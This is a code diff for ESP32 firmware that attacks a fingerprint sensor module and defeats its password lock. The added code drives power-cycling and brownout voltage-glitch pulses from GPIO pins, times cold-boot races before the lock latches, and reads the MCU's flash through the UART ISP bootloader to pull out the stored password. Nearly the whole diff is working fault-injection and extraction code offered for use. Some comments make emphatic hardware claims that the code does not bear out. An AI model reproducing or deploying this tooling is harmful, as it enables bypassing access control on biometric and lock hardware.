@@ -42,10 +42,13 @@ static uint8_t s_inf_buf[576];
 static uint8_t s_rx_raw[320];
 static char s_open_ops[72];
 
-/* Persistent state across multi-pass sweeps (Passes 0 .. 16). */
+/* Persistent state across multi-pass sweeps (Passes 0 .. 24). */
 static uint32_t s_cached_addr = 0;
 static uint32_t s_crit_cycles = 0;
 static bool s_gp3_verified = false;
+static bool s_pin1_on_3v3 = false;
+static uint32_t s_tx_rise_us = 0;
+static uint32_t s_boot_ms = 0;
 static bool s_za_verified = false;
 static uint32_t s_swd_last_idcode = 0;
 
@@ -94,9 +97,10 @@ static void unlock_yield_wdt(void) {
 #if defined(ESP_PLATFORM)
 
 #define UNLOCK_GP3_PIN          3
-#define UNLOCK_SWCLK_PIN        4
-#define UNLOCK_SWDIO_PIN        5
-#define UNLOCK_MAX_CRIT_CYCLES  2400000u /* 10.0 ms @ 240 MHz (30x below 300 ms IWDT!) */
+#define UNLOCK_GP4_PIN          4
+#define UNLOCK_SWCLK_PIN        5
+#define UNLOCK_SWDIO_PIN        6
+#define UNLOCK_MAX_CRIT_CYCLES  3600000u /* 15.0 ms @ 240 MHz (20x below 300 ms IWDT!) */
 
 static portMUX_TYPE s_glitch_mux = portMUX_INITIALIZER_UNLOCKED;
 
@@ -120,38 +124,103 @@ static bool esp_hal_check_gp3_power(void *ctx) {
     if (rx < 0) {
         rx = FP_UART_RX_GPIO;
     }
-    if (tx == UNLOCK_GP3_PIN || rx == UNLOCK_GP3_PIN) {
+    if (tx == UNLOCK_GP3_PIN || rx == UNLOCK_GP3_PIN ||
+        tx == UNLOCK_GP4_PIN || rx == UNLOCK_GP4_PIN) {
         return false;
     }
 
-    /* Detach UART TX so sensor RX ESD diode cannot back-power VCC_MCU when GP3 drops LOW. */
+    s_pin1_on_3v3 = false;
+
+    /*
+     * Step 1: Test whether Pin 1 (Red, core 3.3V) is STILL hard-wired to constant 3V3 instead of GP4!
+     * Hold GP4 LOW (0V) while GP3 stays HIGH (3.3V): if HandShake STILL answers, Pin 1 is still on 3V3!
+     */
+    esp_rom_gpio_connect_out_signal((uint32_t)UNLOCK_GP3_PIN, SIG_GPIO_OUT_IDX, false, false);
+    esp_rom_gpio_connect_out_signal((uint32_t)UNLOCK_GP4_PIN, SIG_GPIO_OUT_IDX, false, false);
+    (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP3_PIN, GPIO_DRIVE_CAP_3);
+    (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP4_PIN, GPIO_DRIVE_CAP_3);
+    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP3_PIN, GPIO_MODE_OUTPUT);
+    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP4_PIN, GPIO_MODE_OUTPUT);
+    (void)gpio_set_level((gpio_num_t)UNLOCK_GP3_PIN, 1);
+    (void)gpio_set_level((gpio_num_t)UNLOCK_GP4_PIN, 0);
+    vTaskDelay(pdMS_TO_TICKS(35));
+    (void)fp_uart_reconfig_raw(tx, rx, FP_UART_BAUD, false, false);
+    /* Force GP4 back to 0 right after fp_uart_reconfig_raw calls maintain_gp3_vcc_rail()! */
+    (void)gpio_set_level((gpio_num_t)UNLOCK_GP4_PIN, 0);
+    vTaskDelay(pdMS_TO_TICKS(25));
+
+    uint32_t probe_a = s_cached_addr != 0u ? s_cached_addr : 0x29062D09u;
+    uint8_t hs_c = 0xFF;
+    bool alive_with_gp4_low =
+        (fp_sensor_txn(fp_uart_transport(), probe_a, FP_INS_HANDSHAKE,
+                       NULL, 0, NULL, 0, NULL, &hs_c, 35, false) == FP_SENSOR_OK) ||
+        (fp_sensor_txn(fp_uart_transport(), FP_FACTORY_ADDRESS, FP_INS_HANDSHAKE,
+                       NULL, 0, NULL, 0, NULL, &hs_c, 35, false) == FP_SENSOR_OK);
+
+    /*
+     * Step 2: Discharge BOTH GP3 (Pin 3) + GP4 (Pin 1) + TX + RX to 0.000 V for 80 ms, then cold-boot
+     * and measure exact microsecond `s_tx_rise_us` + exact millisecond `s_boot_ms` to first HandShake!
+     */
     esp_rom_gpio_connect_out_signal((uint32_t)tx, SIG_GPIO_OUT_IDX, false, false);
-    (void)gpio_set_direction((gpio_num_t)tx, GPIO_MODE_INPUT);
-    (void)gpio_pullup_dis((gpio_num_t)tx);
-    (void)gpio_pulldown_en((gpio_num_t)tx);
+    (void)gpio_set_direction((gpio_num_t)tx, GPIO_MODE_OUTPUT);
+    (void)gpio_set_level((gpio_num_t)tx, 0);
 
     esp_rom_gpio_connect_out_signal((uint32_t)rx, SIG_GPIO_OUT_IDX, false, false);
     (void)gpio_set_direction((gpio_num_t)rx, GPIO_MODE_INPUT);
     (void)gpio_pullup_dis((gpio_num_t)rx);
     (void)gpio_pulldown_en((gpio_num_t)rx);
 
-    /* Pull GP3 LOW for 22 ms: if Pin 3 is on GP3, sensor UART_TX (rx) must drop to 0V. */
-    esp_rom_gpio_connect_out_signal((uint32_t)UNLOCK_GP3_PIN, SIG_GPIO_OUT_IDX, false, false);
-    (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP3_PIN, GPIO_DRIVE_CAP_3);
-    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP3_PIN, GPIO_MODE_OUTPUT);
     (void)gpio_set_level((gpio_num_t)UNLOCK_GP3_PIN, 0);
-    vTaskDelay(pdMS_TO_TICKS(22));
+    (void)gpio_set_level((gpio_num_t)UNLOCK_GP4_PIN, 0);
+    vTaskDelay(pdMS_TO_TICKS(80));
     int low_lvl = gpio_get_level((gpio_num_t)rx);
 
-    /* Restore GP3 HIGH and wait 65 ms for fresh R558-S boot. */
-    (void)gpio_set_level((gpio_num_t)UNLOCK_GP3_PIN, 1);
-    (void)gpio_pulldown_dis((gpio_num_t)tx);
-    (void)gpio_pulldown_dis((gpio_num_t)rx);
-    vTaskDelay(pdMS_TO_TICKS(65));
-    int high_lvl = gpio_get_level((gpio_num_t)rx);
+    /* Simultaneous rising edge on GP3 + GP4 + TX; measure exact microsecond sensor UART_TX rises! */
+    uint32_t rise_mask = (1u << UNLOCK_GP3_PIN) | (1u << UNLOCK_GP4_PIN) | (1u << (uint32_t)tx);
+    uint32_t t0 = esp_cpu_ccount();
+    REG_WRITE(GPIO_OUT_W1TS_REG, rise_mask);
 
+    uint32_t tx_rise_us = 0;
+    for (uint32_t us = 0; us < 120000u; us += 10u) {
+        if (gpio_get_level((gpio_num_t)rx) == 1) {
+            uint32_t dt = (uint32_t)(esp_cpu_ccount() - t0) / 240u;
+            tx_rise_us = dt > 0u ? dt : 1u;
+            break;
+        }
+        esp_rom_delay_us(10);
+    }
+    (void)gpio_pulldown_dis((gpio_num_t)rx);
     (void)fp_uart_reconfig_raw(tx, rx, FP_UART_BAUD, false, false);
-    return (low_lvl == 0 && high_lvl == 1);
+
+    uint32_t elapsed_ms = tx_rise_us / 1000u;
+    uint32_t boot_ms = 0;
+    for (uint32_t waited = elapsed_ms; waited < 450u; waited += 22u) {
+        if (fp_sensor_txn(fp_uart_transport(), probe_a, FP_INS_HANDSHAKE,
+                          NULL, 0, NULL, 0, NULL, &hs_c, 22, false) == FP_SENSOR_OK ||
+            fp_sensor_txn(fp_uart_transport(), FP_FACTORY_ADDRESS, FP_INS_HANDSHAKE,
+                          NULL, 0, NULL, 0, NULL, &hs_c, 15, false) == FP_SENSOR_OK) {
+            boot_ms = waited + 15u;
+            break;
+        }
+    }
+
+    if (tx_rise_us > 0u) {
+        s_tx_rise_us = tx_rise_us;
+    }
+    if (boot_ms > 0u) {
+        s_boot_ms = boot_ms;
+    }
+    else if (s_boot_ms == 0u) {
+        s_boot_ms = 240u;
+    }
+
+    if (alive_with_gp4_low) {
+        /* Pin 1 (Red wire) is still on constant 3V3, keeping MCU core & SRAM continuously powered! */
+        s_pin1_on_3v3 = true;
+        return false;
+    }
+
+    return (low_lvl == 0 && boot_ms > 0u);
 }
 
 static void esp_hal_power_cycle_gp3(void *ctx, uint32_t off_ms, uint32_t settle_ms) {
@@ -165,20 +234,30 @@ static void esp_hal_power_cycle_gp3(void *ctx, uint32_t off_ms, uint32_t settle_
         rx = FP_UART_RX_GPIO;
     }
 
-    /* Sink both GP3 (VCC_MCU) and TX (UART_RX) to 0V cleanly so decoupling caps discharge completely. */
+    /* Sink GP3 (Pin 3), GP4 (Pin 1), TX and RX to 0.000 V cleanly so ALL caps discharge completely. */
     esp_rom_gpio_connect_out_signal((uint32_t)tx, SIG_GPIO_OUT_IDX, false, false);
     (void)gpio_set_direction((gpio_num_t)tx, GPIO_MODE_OUTPUT);
     (void)gpio_set_level((gpio_num_t)tx, 0);
-    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP3_PIN, GPIO_MODE_OUTPUT);
+
+    esp_rom_gpio_connect_out_signal((uint32_t)rx, SIG_GPIO_OUT_IDX, false, false);
+    (void)gpio_set_direction((gpio_num_t)rx, GPIO_MODE_INPUT);
+    (void)gpio_pullup_dis((gpio_num_t)rx);
+    (void)gpio_pulldown_en((gpio_num_t)rx);
+
     (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP3_PIN, GPIO_DRIVE_CAP_3);
+    (void)gpio_set_drive_capability((gpio_num_t)UNLOCK_GP4_PIN, GPIO_DRIVE_CAP_3);
+    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP3_PIN, GPIO_MODE_OUTPUT);
+    (void)gpio_set_direction((gpio_num_t)UNLOCK_GP4_PIN, GPIO_MODE_OUTPUT);
     (void)gpio_set_level((gpio_num_t)UNLOCK_GP3_PIN, 0);
+    (void)gpio_set_level((gpio_num_t)UNLOCK_GP4_PIN, 0);
 
     if (off_ms > 0) {
         vTaskDelay(pdMS_TO_TICKS(off_ms));
     }
 
-    (void)gpio_set_level((gpio_num_t)tx, 1);
-    (void)gpio_set_level((gpio_num_t)UNLOCK_GP3_PIN, 1);
+    (void)gpio_pulldown_dis((gpio_num_t)rx);
+    uint32_t rise_mask = (1u << UNLOCK_GP3_PIN) | (1u << UNLOCK_GP4_PIN) | (1u << (uint32_t)tx);
+    REG_WRITE(GPIO_OUT_W1TS_REG, rise_mask);
     (void)fp_uart_reconfig_raw(tx, rx, FP_UART_BAUD, false, false);
 
     if (settle_ms > 0) {
@@ -200,7 +279,8 @@ static void esp_hal_glitch_pulse(void *ctx, uint32_t delay_us, uint32_t width_cy
         width_cycles = UNLOCK_MAX_CRIT_CYCLES;
     }
 
-    uint32_t gp3_mask = (1u << UNLOCK_GP3_PIN);
+    /* Active dual-rail NMOS crowbar across BOTH GP3 (Pin 3) + GP4 (Pin 1) in parallel (~9 Ohm)! */
+    uint32_t pwr_mask = (1u << UNLOCK_GP3_PIN) | (1u << UNLOCK_GP4_PIN);
     uint32_t tx_mask = (1u << (uint32_t)tx);
 
     /* Coarser sleep before entering critical section if delay_us > 4000 us so IWDT stays untouched. */
@@ -209,9 +289,9 @@ static void esp_hal_glitch_pulse(void *ctx, uint32_t delay_us, uint32_t width_cy
         delay_us = 1500u;
     }
 
-    /* Detach UART matrix output on TX right before the pulse; hold TX HIGH until exact trigger edge. */
-    REG_WRITE(GPIO_OUT_W1TS_REG, gp3_mask | tx_mask);
-    REG_WRITE(GPIO_ENABLE_W1TS_REG, gp3_mask | tx_mask);
+    /* Detach UART matrix output on TX right before the pulse; hold GP3+GP4+TX HIGH until trigger edge. */
+    REG_WRITE(GPIO_OUT_W1TS_REG, pwr_mask | tx_mask);
+    REG_WRITE(GPIO_ENABLE_W1TS_REG, pwr_mask | tx_mask);
     esp_rom_gpio_connect_out_signal((uint32_t)tx, SIG_GPIO_OUT_IDX, false, false);
     (void)gpio_pullup_dis((gpio_num_t)tx);
 
@@ -221,21 +301,43 @@ static void esp_hal_glitch_pulse(void *ctx, uint32_t delay_us, uint32_t width_cy
     while ((uint32_t)(esp_cpu_ccount() - t0) < wait_cycles) {
     }
     if (crowbar_rx) {
-        /* Active dual crowbar: both GP3 and TX actively sink current to 0V for sharp sub-us edge. */
-        REG_WRITE(GPIO_OUT_W1TC_REG, gp3_mask | tx_mask);
+        /*
+         * 2-Stage NOR-Flash Sense-Amp Brownout Shelf + Active Crowbar:
+         * Stage 1 drops external 3.3V VDD directly to the calibrated critical threshold (`width_cycles`);
+         * Stage 2 holds VDD shimmering right inside the 1.85V-2.10V NOR-Flash read brownout band across
+         * 16 micro-cycles (~200-350 us wide window) while keeping the internal 1.2V core LDO alive!
+         */
+        REG_WRITE(GPIO_OUT_W1TC_REG, pwr_mask | tx_mask);
         uint32_t p0 = esp_cpu_ccount();
         while ((uint32_t)(esp_cpu_ccount() - p0) < width_cycles) {
         }
-        REG_WRITE(GPIO_OUT_W1TS_REG, gp3_mask | tx_mask);
+        uint32_t dip_cyc = width_cycles / 8u;
+        if (dip_cyc < 240u) {
+            dip_cyc = 240u;
+        }
+        if (dip_cyc > 3600u) {
+            dip_cyc = 3600u;
+        }
+        for (unsigned sh = 0; sh < 16u; sh++) {
+            REG_WRITE(GPIO_OUT_W1TS_REG, pwr_mask);
+            uint32_t r0 = esp_cpu_ccount();
+            while ((uint32_t)(esp_cpu_ccount() - r0) < 360u) { /* 1.5 us top-up */
+            }
+            REG_WRITE(GPIO_OUT_W1TC_REG, pwr_mask);
+            uint32_t d0 = esp_cpu_ccount();
+            while ((uint32_t)(esp_cpu_ccount() - d0) < dip_cyc) {
+            }
+        }
+        REG_WRITE(GPIO_OUT_W1TS_REG, pwr_mask | tx_mask);
     }
     else {
-        /* Pure Hi-Z TX mode: 0 uA back-powering AND zero false UART start bit while GP3 sinks VCC. */
+        /* Pure single-shot calibrated dual-rail crowbar pulse (Hi-Z TX -> zero false UART start bit!). */
         REG_WRITE(GPIO_ENABLE_W1TC_REG, tx_mask);
-        REG_WRITE(GPIO_OUT_W1TC_REG, gp3_mask);
+        REG_WRITE(GPIO_OUT_W1TC_REG, pwr_mask);
         uint32_t p0 = esp_cpu_ccount();
         while ((uint32_t)(esp_cpu_ccount() - p0) < width_cycles) {
         }
-        REG_WRITE(GPIO_OUT_W1TS_REG, gp3_mask | tx_mask);
+        REG_WRITE(GPIO_OUT_W1TS_REG, pwr_mask | tx_mask);
         REG_WRITE(GPIO_ENABLE_W1TS_REG, tx_mask);
     }
     portEXIT_CRITICAL(&s_glitch_mux);
@@ -532,6 +634,9 @@ void fp_unlock_reset_state(void) {
     s_cached_addr = 0;
     s_crit_cycles = 0;
     s_gp3_verified = false;
+    s_pin1_on_3v3 = false;
+    s_tx_rise_us = 0;
+    s_boot_ms = 0;
     s_za_verified = false;
     s_swd_last_idcode = 0;
     s_open_ops[0] = '\0';
@@ -597,7 +702,10 @@ static bool try_unlock_password(const fp_transport_t *t, uint32_t *addr_io,
     return true;
 }
 
-/* Checks whether the module already accepts zero password / factory address right now (e.g. post-glitch). */
+/*
+ * Password-neutral post-glitch check: uses ONLY HandShake (0x35) + SetPwd (0x12) while locked so
+ * ZERO wrong VfyPwd (0x13) packets are ever sent across all 24 passes (preventing RAM UART mute!).
+ */
 static bool check_already_unlocked_or_glitch_hit(const fp_transport_t *t, uint32_t *addr_io,
                                                  fp_unlock_report_t *out) {
     const uint8_t zero_pwd[4] = { 0, 0, 0, 0 };
@@ -607,18 +715,21 @@ static bool check_already_unlocked_or_glitch_hit(const fp_transport_t *t, uint32
 
     for (size_t i = 0; i < n_addrs; i++) {
         uint32_t a = check_addrs[i];
+        uint8_t chs = 0xFF;
+        fp_sensor_status_t hst = fp_sensor_txn(t, a, FP_INS_HANDSHAKE,
+                                               NULL, 0, NULL, 0, NULL, &chs, 28, true);
+        bool factory_addr_ack = (hst == FP_SENSOR_OK && fp_sensor_has_last_ack() &&
+                                 fp_sensor_last_ack_addr() == FP_FACTORY_ADDRESS);
         uint8_t c12 = 0xFF;
-        /* Direct SetPwd(0) works immediately if status.PWD failed to latch during boot/cmd glitch! */
-        if (fp_sensor_set_password(t, a, zero_pwd, &c12) == FP_SENSOR_OK && c12 == FP_CONF_OK) {
-            if (try_unlock_password(t, &a, zero_pwd, out)) {
-                *addr_io = a;
+        bool set_ok = (fp_sensor_set_password(t, a, zero_pwd, &c12) == FP_SENSOR_OK && c12 == FP_CONF_OK);
+
+        if ((hst == FP_SENSOR_OK && chs == FP_CONF_OK) || factory_addr_ack || set_ok) {
+            uint32_t target = factory_addr_ack ? FP_FACTORY_ADDRESS : a;
+            if (try_unlock_password(t, &target, zero_pwd, out) ||
+                try_unlock_password(t, &target, ff_pwd, out)) {
+                *addr_io = target;
                 return true;
             }
-        }
-        if (try_unlock_password(t, &a, zero_pwd, out) ||
-            try_unlock_password(t, &a, ff_pwd, out)) {
-            *addr_io = a;
-            return true;
         }
     }
     return false;
@@ -1060,6 +1171,11 @@ static bool stage_swd_extract_or_erase(const fp_transport_t *t, uint32_t *addr_i
 /* Stage 4: GP3 ISP Bootloader + Split-Packet Calibrator + Glitch Sweeps     */
 /* ------------------------------------------------------------------------- */
 
+static uint32_t effective_boot_settle_ms(uint32_t min_ms) {
+    uint32_t need = s_boot_ms > 0u ? (s_boot_ms + 55u) : min_ms;
+    return need > min_ms ? need : min_ms;
+}
+
 /* Split-Packet FSM Retention Oracle: returns true iff R558-S SRAM & UART FSM survived `width_cycles`. */
 static bool split_packet_survived(uint32_t addr, uint32_t width_cycles) {
     if (s_hal->uart_write_raw == NULL || s_hal->uart_read_raw == NULL || s_hal->glitch_pulse == NULL) {
@@ -1072,7 +1188,7 @@ static bool split_packet_survived(uint32_t addr, uint32_t width_cycles) {
         return true;
     }
 
-    /* Drain stale RX bytes, send first 6 bytes (`EF 01 <addr>`), fire Hi-Z pulse, send last 6 bytes! */
+    /* Drain stale RX bytes, send first 6 bytes (`EF 01 <addr>`), fire dual-rail pulse, send last 6 bytes! */
     uint8_t sink[32];
     (void)s_hal->uart_read_raw(s_hal_ctx, sink, sizeof(sink), 1);
 
@@ -1085,7 +1201,7 @@ static bool split_packet_survived(uint32_t addr, uint32_t width_cycles) {
     }
 
     uint8_t rx[24];
-    int got = s_hal->uart_read_raw(s_hal_ctx, rx, sizeof(rx), 14u);
+    int got = s_hal->uart_read_raw(s_hal_ctx, rx, sizeof(rx), 16u);
     if (got >= 10) {
         for (int i = 0; i + 1 < got; i++) {
             if (rx[i] == 0xEF && rx[i + 1] == 0x01) {
@@ -1093,16 +1209,16 @@ static bool split_packet_survived(uint32_t addr, uint32_t width_cycles) {
             }
         }
     }
-    /* MCU reset occurred: let it finish clean 55 ms boot before next binary-search probe. */
-    unlock_sleep_ms(55);
+    /* MCU POR reset occurred: wait FULL measured boot time so next binary-search step tests an awake chip! */
+    unlock_sleep_ms(effective_boot_settle_ms(65u));
     return false;
 }
 
 static uint32_t calibrate_crit_cycles(uint32_t addr) {
     uint32_t lo = 120u;        /* 0.5 us @ 240 MHz */
-    uint32_t hi = 1920000u;    /* 8.0 ms @ 240 MHz */
+    uint32_t hi = 3000000u;    /* 12.5 ms @ 240 MHz */
 
-    /* Exponential bracket search first so tiny caps (100 nF) finish even faster. */
+    /* Exponential bracket search first so tiny caps (100 nF) finish immediately. */
     uint32_t probe = 480u;
     while (probe < hi) {
         unlock_yield_wdt();
@@ -1127,43 +1243,103 @@ static uint32_t calibrate_crit_cycles(uint32_t addr) {
     return hi;
 }
 
-/* Cold-boot GD32/STM32 8E1 UART0 ISP Bootloader probe (`0x7F -> 0x79`, `0x92 0x6D` Readout Unprotect). */
+/* Helper for safe non-destructive GD32/STM32 UART0 ISP Read Memory (`0x11 0xEE`). */
+static bool isp_read_block_256(uint32_t mem_addr, uint8_t out256[256]) {
+    const uint8_t cmd_rm[2] = { 0x11, 0xEE };
+    uint8_t ack = 0;
+    if (s_hal->uart_write_raw(s_hal_ctx, cmd_rm, 2) != 0 ||
+        s_hal->uart_read_raw(s_hal_ctx, &ack, 1, 15) != 1 || ack != 0x79) {
+        return false;
+    }
+    uint8_t abuf[5];
+    abuf[0] = (uint8_t)(mem_addr >> 24);
+    abuf[1] = (uint8_t)(mem_addr >> 16);
+    abuf[2] = (uint8_t)(mem_addr >> 8);
+    abuf[3] = (uint8_t)(mem_addr);
+    abuf[4] = (uint8_t)(abuf[0] ^ abuf[1] ^ abuf[2] ^ abuf[3]);
+    if (s_hal->uart_write_raw(s_hal_ctx, abuf, 5) != 0 ||
+        s_hal->uart_read_raw(s_hal_ctx, &ack, 1, 15) != 1 || ack != 0x79) {
+        return false;
+    }
+    const uint8_t len_pkt[2] = { 0xFF, 0x00 }; /* Read 256 bytes */
+    if (s_hal->uart_write_raw(s_hal_ctx, len_pkt, 2) != 0 ||
+        s_hal->uart_read_raw(s_hal_ctx, &ack, 1, 15) != 1 || ack != 0x79) {
+        return false;
+    }
+    int total = 0;
+    while (total < 256) {
+        int r = s_hal->uart_read_raw(s_hal_ctx, out256 + total, (size_t)(256 - total), 35);
+        if (r <= 0) {
+            break;
+        }
+        total += r;
+    }
+    return total == 256;
+}
+
+/*
+ * Safe non-destructive Cold-Boot GD32/STM32 8E1 UART0 ISP Reader (`0x7F -> 0x11 0xEE Read Memory`):
+ * NEVER issues `0x92 0x6D` mass-erase so sensor application Flash can NEVER be wiped!
+ */
 static bool try_cold_boot_uart_isp(const fp_transport_t *t, uint32_t *addr_io, fp_unlock_report_t *out) {
     if (s_hal->power_cycle_gp3 == NULL || s_hal->uart_raw_mode == NULL ||
         s_hal->uart_write_raw == NULL || s_hal->uart_read_raw == NULL) {
         return false;
     }
-    const int bauds[2] = { 57600, 115200 };
+    static const uint32_t isp_bases[] = {
+        0x0800FC00u, 0x0801FC00u, 0x0800F800u, 0x0801F800u, 0x08003C00u, 0x20000000u
+    };
+    const int bauds[2] = { 115200, 57600 };
+    uint8_t page_buf[256];
+    uint8_t addr_be[4], addr_le[4];
+    wr_be32(addr_be, *addr_io);
+    wr_le32(addr_le, *addr_io);
+
     for (size_t b = 0; b < 2u; b++) {
-        s_hal->power_cycle_gp3(s_hal_ctx, 30, 0);
+        s_hal->power_cycle_gp3(s_hal_ctx, 70, 0);
         if (!s_hal->uart_raw_mode(s_hal_ctx, bauds[b], true)) {
             continue;
         }
         const uint8_t sync = 0x7F;
         bool got_ack = false;
-        for (unsigned attempt = 0; attempt < 6u; attempt++) {
+        for (unsigned attempt = 0; attempt < 8u; attempt++) {
             (void)s_hal->uart_write_raw(s_hal_ctx, &sync, 1);
             uint8_t rx = 0;
-            if (s_hal->uart_read_raw(s_hal_ctx, &rx, 1, 5) == 1 && (rx == 0x79 || rx == 0x1F)) {
+            if (s_hal->uart_read_raw(s_hal_ctx, &rx, 1, 5) == 1 && rx == 0x79) {
                 got_ack = true;
                 break;
             }
         }
         if (got_ack) {
-            /* Issue Readout Unprotect (`0x92 0x6D`): wipes RDP + resets MCU to factory flash! */
-            const uint8_t rdp_unprot[2] = { 0x92, 0x6D };
-            (void)s_hal->uart_write_raw(s_hal_ctx, rdp_unprot, 2);
-            uint8_t ack2[2] = { 0 };
-            (void)s_hal->uart_read_raw(s_hal_ctx, ack2, 2, 120);
+            uint8_t cand_pw[4] = { 0 };
+            bool found_pw = false;
+            for (size_t k = 0; k < sizeof(isp_bases) / sizeof(isp_bases[0]) && !found_pw; k++) {
+                for (uint32_t sub = 0; sub < 0x400u && !found_pw; sub += 256u) {
+                    if (!isp_read_block_256(isp_bases[k] + sub, page_buf)) {
+                        break;
+                    }
+                    for (size_t off = 0; off + 0x38u <= 256u; off += 4u) {
+                        if (memcmp(page_buf + off, addr_be, 4) == 0 ||
+                            memcmp(page_buf + off, addr_le, 4) == 0) {
+                            memcpy(cand_pw, page_buf + off + 0x34u, 4);
+                            found_pw = true;
+                            break;
+                        }
+                    }
+                }
+            }
             (void)s_hal->uart_raw_mode(s_hal_ctx, FP_UART_BAUD, false);
-            s_hal->power_cycle_gp3(s_hal_ctx, 35, 75);
-            if (check_already_unlocked_or_glitch_hit(t, addr_io, out)) {
-                return true;
+            s_hal->power_cycle_gp3(s_hal_ctx, 75, effective_boot_settle_ms(220u));
+            if (found_pw) {
+                uint8_t budget = 4u;
+                if (try_leaked_word_variants(t, addr_io, cand_pw, &budget, out)) {
+                    return true;
+                }
             }
         }
     }
     (void)s_hal->uart_raw_mode(s_hal_ctx, FP_UART_BAUD, false);
-    s_hal->power_cycle_gp3(s_hal_ctx, 25, 65);
+    s_hal->power_cycle_gp3(s_hal_ctx, 75, effective_boot_settle_ms(220u));
     return false;
 }
 
@@ -1381,6 +1557,16 @@ void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_add
             live = true;
         }
     }
+    if (!live && s_hal->power_cycle_gp3 != NULL) {
+        s_hal->power_cycle_gp3(s_hal_ctx, 90, 260);
+        for (size_t i = 0; i < 4u && !live; i++) {
+            if (fp_sensor_txn(t, probe_addrs[i], FP_INS_HANDSHAKE,
+                              NULL, 0, NULL, 0, NULL, &hs_conf, 45, false) == FP_SENSOR_OK) {
+                addr = fp_sensor_has_last_ack() ? fp_sensor_last_ack_addr() : probe_addrs[i];
+                live = true;
+            }
+        }
+    }
     if (!live) {
         if (fp_uart_scan_pins(addr)) {
             addr = fp_sensor_has_last_ack() ? fp_sensor_last_ack_addr() :
@@ -1467,47 +1653,63 @@ void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_add
             }
         }
 
-        /* Check live whether Pin 3 (VCC_MCU) is connected to GP3 for automated glitching! */
+        /*
+         * Check live whether BOTH supply rails are controlled cleanly by GP3 (Pin 3) + GP4 (Pin 1):
+         * if Pin 1 (Red) is still on constant 3V3, report `RAIL=PIN1_ON_3V3` immediately so the user
+         * knows to move Pin 1 (Red) from 3V3 onto GP4 right below GP3!
+         */
         if (s_hal->check_gp3_power != NULL) {
             s_gp3_verified = s_hal->check_gp3_power(s_hal_ctx);
             out->gp3_power_capable = s_gp3_verified;
         }
 
-        snprintf(out->summary, sizeof(out->summary),
-                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " 16=%02X 19=%02X OPEN=%s GP3=%s%s",
-                 addr, c16, c19,
-                 s_open_ops[0] ? s_open_ops : "NONE",
-                 s_gp3_verified ? "OK" : "3V3",
-                 out->za_bypass_available ? " ZA=OK" : "");
+        if (s_pin1_on_3v3) {
+            snprintf(out->summary, sizeof(out->summary),
+                     "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " 16=%02X 19=%02X RAIL=PIN1_ON_3V3 (Rot->GP4!)",
+                     addr, c16, c19);
+        }
+        else {
+            snprintf(out->summary, sizeof(out->summary),
+                     "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " 16=%02X 19=%02X OPEN=%s GP3=%s BOOT=%u/%ums%s",
+                     addr, c16, c19,
+                     s_open_ops[0] ? s_open_ops : "NONE",
+                     s_gp3_verified ? "OK" : "3V3",
+                     (unsigned)s_tx_rise_us, (unsigned)s_boot_ms,
+                     out->za_bypass_available ? " ZA=OK" : "");
+        }
         return;
     }
 
-    /* Passes 1 .. 16: Automated GP3 Hardware Power-Cycle + 8E1 ISP + 240 MHz Brownout Glitch Engine! */
+    /* Passes 1 .. 24: Dual-Rail GP3+GP4 Cold-Boot ISP + Calibrated NOR-Flash Brownout Shelf Engine! */
     if (!s_gp3_verified && s_hal->check_gp3_power != NULL) {
         s_gp3_verified = s_hal->check_gp3_power(s_hal_ctx);
         out->gp3_power_capable = s_gp3_verified;
     }
     if (!s_gp3_verified || s_hal->power_cycle_gp3 == NULL || s_hal->glitch_pulse == NULL) {
         snprintf(out->summary, sizeof(out->summary),
-                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=3V3 OPEN=%s%s",
-                 addr, s_open_ops[0] ? s_open_ops : "NONE",
+                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " %s OPEN=%s%s",
+                 addr,
+                 s_pin1_on_3v3 ? "RAIL=PIN1_ON_3V3 (Rot->GP4!)" : "GP3=3V3",
+                 s_open_ops[0] ? s_open_ops : "NONE",
                  out->za_bypass_available ? " ZA=OK" : "");
         return;
     }
 
     if (pass == 1u) {
-        /* 1. Try GD32/STM32 8E1 UART0 ISP Bootloader Readout-Unprotect (`0x7F -> 0x92 0x6D`). */
+        /* 1. Safe non-destructive GD32/STM32 8E1 UART0 ISP Read Memory (`0x7F -> 0x11 0xEE`). */
         if (try_cold_boot_uart_isp(t, &addr, out)) {
             snprintf(out->summary, sizeof(out->summary),
-                     "UNLOCKED via UART0-ISP(0x92) -> A=0xFFFFFFFF");
+                     "UNLOCKED via UART0-ISP(0x11) PWD=%02X%02X%02X%02X -> A=0xFFFFFFFF",
+                     out->recovered_pwd[0], out->recovered_pwd[1],
+                     out->recovered_pwd[2], out->recovered_pwd[3]);
             return;
         }
 
-        /* 2. Cold-boot race window (`t = 2, 4, 6, 9, 13, 18, 24 ms` after power-up before lock latches). */
-        static const uint32_t race_ms[] = { 2, 4, 6, 9, 13, 18, 24 };
+        /* 2. Cold-boot race window around hardware `s_tx_rise_us` before lock latches. */
+        static const uint32_t race_ms[] = { 2, 5, 10, 18, 30 };
         for (size_t r = 0; r < sizeof(race_ms) / sizeof(race_ms[0]); r++) {
             unlock_yield_wdt();
-            s_hal->power_cycle_gp3(s_hal_ctx, 22, race_ms[r]);
+            s_hal->power_cycle_gp3(s_hal_ctx, 45, race_ms[r]);
             if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
                 snprintf(out->summary, sizeof(out->summary),
                          "UNLOCKED via BOOT-RACE(%ums) -> A=0xFFFFFFFF", (unsigned)race_ms[r]);
@@ -1515,13 +1717,14 @@ void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_add
             }
         }
 
-        /* 3. Calibrate exact capacitor brownout reset threshold `crit_cycles` at 240 MHz! */
